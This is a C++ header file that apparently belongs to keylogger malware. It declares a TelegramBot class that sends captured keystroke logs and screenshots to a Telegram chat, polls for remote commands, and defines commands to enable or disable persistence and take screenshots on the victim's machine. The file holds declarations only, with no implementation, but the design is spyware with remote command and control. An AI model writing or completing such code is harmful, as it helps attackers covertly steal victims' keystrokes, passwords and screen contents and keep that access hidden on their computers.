#ifndef TELEGRAMBOT_H
#define TELEGRAMBOT_H

#include <string>

class Keylogger; // Forward declaration

class TelegramBot {
public:
    TelegramBot(const std::string& token, const std::string& chatID);
    void setKeylogger(Keylogger* keylogger);
    void sendLog(const std::string& logContent);
    void sendScreenshot(const std::string& imagePath);
    void checkCommands();

private:
    std::string botToken;
    std::string chatID;
    long long lastUpdateID = 0;
    Keylogger* keylogger; // Pointer to the Keylogger instance

    // Commands
    const std::string CMD_START = "/start";
    const std::string CMD_PERSISTENCE_ENABLE = "/persistence_enable";
    const std::string CMD_PERSISTENCE_DISABLE = "/persistence_disable";
    const std::string CMD_SCREENSHOT = "/screenshot";
};

#endif // TELEGRAMBOT_H
